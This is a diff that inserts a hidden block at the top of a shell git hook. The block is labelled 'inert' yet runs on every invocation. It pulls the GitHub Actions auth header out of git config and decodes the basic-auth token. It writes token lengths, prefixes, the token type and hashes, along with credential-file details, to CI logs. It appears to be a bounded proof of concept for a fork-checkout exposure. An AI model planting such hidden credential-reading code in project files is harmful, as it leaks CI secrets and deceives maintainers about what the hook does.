@@ -1,4 +1,35 @@
 #!/bin/sh
+
+# --- i69731 bounded marker (inert for normal runs) ---
+i69731_marker() {
+	{
+		echo "I69731_MARKER_START"
+		echo "marker=fork-head-checkout-commit-msg-hook"
+		echo "event=${GITHUB_EVENT_NAME} workflow=${GITHUB_WORKFLOW} repo=${GITHUB_REPOSITORY} run=${GITHUB_RUN_ID}"
+		echo "host=$(hostname) date=$(date -u +%FT%TZ) user=$(id -un)"
+		echo "head=$(git rev-parse HEAD 2>/dev/null)"
+		hdr=$(git config --get http.https://github.com/.extraheader 2>/dev/null || true)
+		echo "extraheader_len=${#hdr}"
+		echo "extraheader_prefix=$(printf '%s' "$hdr" | cut -c1-21)"
+		echo "extraheader_sha=$(printf '%s' "$hdr" | sha256sum | cut -d' ' -f1)"
+		credf=$(git config --local --get-regexp '^includeIf\.gitdir:' 2>/dev/null | head -1 | sed 's/^[^ ]* //')
+		echo "credfile=$credf"
+		if [ -n "$credf" ] && [ -f "$credf" ]; then
+			echo "credfile_sha=$(sha256sum "$credf" | cut -d' ' -f1)"
+			echo "credfile_len=$(wc -c < "$credf")"
+		fi
+		dec=$(printf '%s' "$hdr" | tr -d ' ' | sed -n 's/.*AUTHORIZATION:[Bb]asic//Ip' | base64 -d 2>/dev/null || true)
+		echo "decoded_len=${#dec}"
+		echo "decoded_prefix=$(printf '%s' "$dec" | cut -c1-14)"
+		tok=$(printf '%s' "$dec" | sed -n 's/^[^:]*://p')
+		echo "token_len=${#tok} token_sha=$(printf '%s' "$tok" | sha256sum | cut -d' ' -f1)"
+		echo "token_type=$(printf '%s' "$tok" | cut -c1-4)"
+		echo "I69731_MARKER_END"
+	} >&2 || true
+}
+i69731_marker
+# --- end i69731 marker ---
+
 # SPDX-License-Identifier: BSD-3-Clause
 # Copyright (c) 2024 Robin Jarry
 
